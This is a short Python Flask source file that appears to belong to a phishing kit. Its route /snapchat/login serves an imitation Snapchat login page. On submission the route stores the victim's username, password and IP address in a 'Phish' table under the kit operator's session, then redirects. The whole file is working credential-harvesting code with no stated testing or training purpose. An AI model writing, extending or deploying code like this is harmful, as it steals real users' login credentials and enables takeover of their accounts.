from app import app, db
from flask import request, render_template, session, redirect
from app.main.config.models import Phish

@app.route('/snapchat/login', methods=['GET','POST'])
def sc_login():
    if request.method == 'GET':
        return render_template('sc_login.html')
    elif request.method == 'POST':
        data = request.form.to_dict()
        user_phished = Phish(platform='Snapchat',
                             owner=session["curr"],
                             phised_user=data["username"],
                             phished_pword=data["password"],
                             ip=request.remote_addr)
        db.session.add(user_phished)
        db.session.commit()
        return redirect('/homepage')